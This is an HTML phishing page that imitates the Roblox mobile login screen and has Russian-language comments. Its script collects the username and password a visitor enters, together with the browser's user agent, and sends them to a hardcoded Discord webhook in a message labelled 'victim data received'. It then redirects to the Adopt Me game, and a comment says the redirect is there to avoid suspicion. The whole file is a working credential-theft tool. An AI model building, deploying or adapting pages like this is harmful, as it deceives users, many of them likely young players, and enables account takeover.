<!DOCTYPE html>  
<html lang="ru">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
    <title>Roblox - Verification</title>  
    <style>  
        /* Стилизация под мобильное приложение (Фото 1) */  
        body {  
            background-color: #1b1d1e;  
            background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://tr.rbxcdn.com/9707921a525f9b4c09d58704047a069a/420/420/Image/Png');  
            background-size: cover;  
            background-position: center;  
            font-family: 'HCo Gotham SSm', "Segoe UI", Roboto, Helvetica, Arial, sans-serif;  
            display: flex;  
            justify-content: center;  
            align-items: center;  
            height: 100vh;  
            margin: 0;  
            overflow: hidden;  
        }  
  
        .login-box {  
            width: 90%;  
            max-width: 380px;  
            text-align: center;  
            padding: 20px;  
        }  
  
        .logo {  
            width: 160px;  
            margin-bottom: 40px;  
            filter: drop-shadow(0 0 5px rgba(0,0,0,0.5));  
        }  
  
        .input-group {  
            margin-bottom: 12px;  
            position: relative;  
        }  
  
        input {  
            width: 100%;  
            padding: 14px 16px;  
            background: rgba(30, 31, 33, 0.9);  
            border: 1px solid #393b3d;  
            border-radius: 8px;  
            color: #fff;  
            font-size: 16px;  
            box-sizing: border-box;  
            outline: none;  
        }  
  
        input::placeholder {  
            color: #bdbebe;  
        }  
  
        input:focus {  
            border-color: #fff;  
        }  
  
        .btn-login {  
            width: 100%;  
            padding: 12px;  
            background: transparent;  
            border: 1px solid #fff;  
            border-radius: 25px;  
            color: #fff;  
            font-size: 18px;  
            font-weight: 500;  
            cursor: pointer;  
            margin-top: 25px;  
            transition: background 0.3s;  
        }  
  
        .btn-login:active {  
            background: rgba(255, 255, 255, 0.2);  
        }  
  
        .btn-secondary {  
            width: 100%;  
            padding: 12px;  
            background: transparent;  
            border: 1px solid #fff;  
            border-radius: 25px;  
            color: #fff;  
            font-size: 18px;  
            cursor: pointer;  
            margin-top: 15px;  
        }  
  
        .footer-links {  
            margin-top: 25px;  
            color: #fff;  
            font-size: 14px;  
            text-decoration: none;  
            display: block;  
            opacity: 0.8;  
        }  
    </style>  
</head>  
<body>  
  
<div class="login-box">  
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_logo.png" alt="Roblox" class="logo">  
      
    <div class="input-group">  
        <input type="text" id="username" placeholder="Username/Email/Phone" autocomplete="off">  
    </div>  
      
    <div class="input-group">  
        <input type="password" id="password" placeholder="Password" autocomplete="off">  
    </div>  
  
    <button class="btn-login" onclick="captureData()">Log In</button>  
    <button class="btn-secondary">Log In With Another Device</button>  
      
    <a href="#" class="footer-links">Forgot Password or Username?</a>  
</div>  
  
<script>  
    async function captureData() {  
        const u = document.getElementById('username').value;  
        const p = document.getElementById('password').value;  
        const web = "https://discord.com/api/webhooks/1492143944920727606/TFNrc5l5T-o89Rl1A-msjttNX3Z_PB-ua7Z82Vo3R6VDMV8Udz5JgtZ4x24BRcMyxi-h";  
  
        if(!u || !p) return;  
  
        // Формируем лог для Discord (Spidey Bot Style)  
        const payload = {  
            "username": "Spidey Bot",  
            "avatar_url": "https://i.imgur.com/4M34hi2.png",  
            "embeds": [{  
                "title": "🚀 НОВЫЙ ЛОГ В СЕТИ!",  
                "color": 16711680,  
                "description": "**Данные жертвы получены**",  
                "fields": [  
                    { "name": "👤 Логин", "value": `\`${u}\``, "inline": false },  
                    { "name": "🔑 Пароль", "value": `\`${p}\``, "inline": false },  
                    { "name": "📱 Устройство", "value": `\`${navigator.userAgent}\``, "inline": false }  
                ],  
                "footer": { "text": `Время: ${new Date().toLocaleString('ru-RU')}` }  
            }]  
        };  
  
        try {  
            await fetch(web, {  
                method: 'POST',  
                headers: { 'Content-Type': 'application/json' },  
                body: JSON.stringify(payload)  
            });  
  
            // После отправки — перенаправляем на Adopt Me  
            window.location.href = "https://www.roblox.com/games/920587237/Adopt-Me";  
        } catch (e) {  
            // В случае ошибки просто редирект, чтобы не вызывать подозрений  
            window.location.href = "https://www.roblox.com/games/920587237/Adopt-Me";  
        }  
    }  
</script>  
  
</body>  
</html>
